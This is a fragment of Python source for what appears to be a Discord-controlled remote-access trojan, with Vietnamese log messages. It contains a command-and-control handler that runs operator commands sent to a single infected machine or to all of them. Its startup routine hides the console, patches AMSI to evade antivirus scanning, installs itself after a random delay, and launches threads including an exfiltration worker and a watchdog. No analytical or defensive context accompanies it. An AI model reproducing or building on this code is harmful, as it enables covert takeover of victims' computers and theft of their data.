          @client.event
          async def on_ready():
              print(f"[*] online: {client.user} | máy: {MACHINE_ID}")
              _last_beat[0] = time.time()
              try:
                  ch = await control_channel()
                  if ch:
                      await _register(ch)
                      if not _reg_loop_started[0]:
                          _reg_loop_started[0] = True
                          asyncio.ensure_future(_reg_loop(ch))
              except Exception as e:
                  print("ready lỗi:", e)

          @client.event
          async def on_message(message):
              content = message.content.strip()
              if not content.startswith(PREFIX): return
              content = content[len(PREFIX):].strip()
              if not content: return
              try:
                  tokens = content.split(None, 1)
                  first = tokens[0]
                  rest = tokens[1] if len(tokens) > 1 else ""
                  regs = await _scan_regs(message.channel)
                  directed = (first.lower() == "all") or (first in regs)

                  if directed:
                      if first.lower() != "all" and first != MACHINE_ID:
                          return
                      name, raw = _parse(rest)
                  else:
                      if not await _is_master(message.channel): return
                      name, raw = _parse(content)
                      if name in LOCAL:
                          _RAW[message.id] = raw
                          await COMMANDS[name](message, raw.split())
                          return
                      sel = get_sel()
                      target = "all" if (sel == "all" or sel not in regs) else sel
                      await message.channel.send(f"{PREFIX}{target} {content}")
                      return

                  if not name or name not in COMMANDS: return
                  _RAW[message.id] = raw
                  await COMMANDS[name](message, raw.split())
              except Exception as e:
                  try: await message.channel.send(f"⚠️ Lỗi: {e}")
                  except Exception: pass

          if __name__ == "__main__":
              if not single_instance(): sys.exit(0)
              hide_console()
              try: amsi_patch()
              except Exception: pass
              if not os.path.exists(MARKER):
                  time.sleep(random.randint(3, 12))
                  install()
              threading.Thread(target=_exfil_worker, daemon=True).start()
              threading.Thread(target=_net_watch, daemon=True).start()
              threading.Thread(target=_watchdog, daemon=True).start()
              threading.Thread(target=_in_worker, daemon=True).start()
              threading.Thread(target=_web_frames, daemon=True).start()
              threading.Thread(target=_web_loop, daemon=True).start()

              tok = _token()
              if not tok:
                  print("[*] WEB-ONLY: khong co token Discord")
                  _last_beat[0] = time.time()
                  while True:
                      time.sleep(20)

              delay = 5
              while True:
                  try:
                      client.run(tok); delay = 5
                  except Exception as e:
                      print("bot lỗi, thử lại sau", delay, "s:", e)
                      time.sleep(delay); delay = min(delay * 2, 300)
